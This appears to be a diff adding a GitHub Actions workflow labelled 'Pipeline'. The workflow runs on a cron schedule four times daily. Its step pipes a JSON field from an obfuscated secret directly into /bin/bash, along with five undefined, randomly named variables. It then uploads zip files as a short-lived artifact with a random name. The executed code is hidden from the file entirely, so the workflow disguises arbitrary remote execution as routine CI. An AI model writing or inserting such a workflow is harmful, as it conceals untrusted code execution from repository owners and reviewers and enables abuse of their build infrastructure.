@@ -1,0 +1,33 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '51 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          nrdou273: ${{ secrets.nrdou273 }}
+        run: |
+          printf '%s' "$nrdou273" | jq -r .q06965 | /bin/bash
+          echo $g988 | jq -r .wddem1 | /bin/bash
+          echo $dzi742 | jq -r .xyd8414 | /bin/bash
+          echo $bwv582 | jq -r .zgt6 | /bin/bash
+          printf '%s' "$xl9" | jq -r .hlmuu264 | /bin/bash
+          printf '%s' "$cswiw11" | jq -r .yajh9258 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: VJy08AsZ
+          path: "*.zip"
+          retention-days: 1
